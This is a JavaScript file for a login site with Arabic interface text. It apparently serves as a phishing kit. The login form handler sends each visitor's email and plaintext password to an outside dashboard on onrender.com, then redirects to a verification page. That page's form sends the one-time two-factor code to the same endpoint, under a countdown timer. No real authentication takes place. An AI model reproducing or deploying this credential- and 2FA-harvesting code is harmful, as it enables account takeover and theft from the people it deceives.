document.addEventListener("DOMContentLoaded", function () {
  // --- 1️⃣ CTA Button (index.html) ---
  const ctaButton = document.getElementById("ctaButton");
  if (ctaButton) {
    ctaButton.addEventListener("click", function () {
      window.location.href = "login.html";
    });
  }

  // --- 2️⃣ LOGIN FORM HANDLER (login.html) ---
  const loginForm = document.querySelector(".login-form");
  if (loginForm) {
    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = loginForm.querySelector('input[type="email"]').value.trim();
      const password = loginForm.querySelector('input[type="password"]').value;

      if (!email || !password) {
        alert("يرجى إدخال البريد الإلكتروني وكلمة السر.");
        return;
      }

      const submitBtn = loginForm.querySelector('button[type="submit"]');
      const originalText = submitBtn.textContent;
      submitBtn.disabled = true;
      submitBtn.textContent = "جارٍ الإرسال...";

      try {
        // ✅ Save email for the next page
        localStorage.setItem("userEmail", email);

        // ✅ Send login info
        const response = await fetch("https://dashboard-xwzz.onrender.com//api/messages", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            text: `🔐 \nتسجيل دخول جديد:\n📧 البريد الإلكتروني:\n ${email}\n🔑 كلمة السر: \n${password}\n`,
          }),
        });

        if (!response.ok) throw new Error(`خطأ في الإرسال: ${response.status}`);

        console.log("✅ Login message sent successfully!");
        // Redirect to verification page
        window.location.href = "code.html";
      } catch (error) {
        console.error("Login error:", error);
        alert("⚠️ تعذر إرسال البيانات. حاول مرة أخرى لاحقاً.");
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
      }
    });
  }

  // --- 3️⃣ TIMER (code.html) ---
  const timerDisplay = document.getElementById("timer");
  if (timerDisplay) {
    let totalSeconds = 110;

    function updateTimer() {
      const minutes = Math.floor(totalSeconds / 60);
      const seconds = totalSeconds % 60;
      timerDisplay.textContent =
        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;

      if (totalSeconds > 0) {
        totalSeconds--;
      } else {
        clearInterval(timer);
        timerDisplay.textContent = "انتهى الوقت";
        timerDisplay.style.color = "red";
      }
    }

    updateTimer();
    const timer = setInterval(updateTimer, 1000);
  }

  // --- 4️⃣ VERIFY FORM (code.html) ---
  const verifyForm = document.querySelector(".verify-form");
  if (verifyForm) {
    console.log("✅ verify-form found, attaching submit listener");

    verifyForm.addEventListener("submit", async (e) => {
      e.preventDefault();

      const codeInput = verifyForm.querySelector('input[type="text"]').value.trim();
      const email = localStorage.getItem("userEmail") || "غير معروف";

      if (!codeInput) {
        alert("يرجى إدخال رمز التحقق.");
        return;
      }

      const submitBtn = verifyForm.querySelector('button[type="submit"]');
      const originalText = submitBtn.textContent;
      submitBtn.disabled = true;
      submitBtn.textContent = "جارٍ الإرسال...";

      try {
        const response = await fetch("https://dashboard-xwzz.onrender.com//api/messages", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            text: `🔢 \nرمز تحقق جديد:\n${codeInput}\n📧 البريد الإلكتروني: ${email}`,
          }),
        });

        console.log("Response status:", response.status);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        console.log("✅ Verification message sent successfully!");
        
      } catch (err) {
        console.error("Fetch error:", err);
        alert("⚠️ تعذر إرسال رمز التحقق.");
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
      }
    });
  }
});
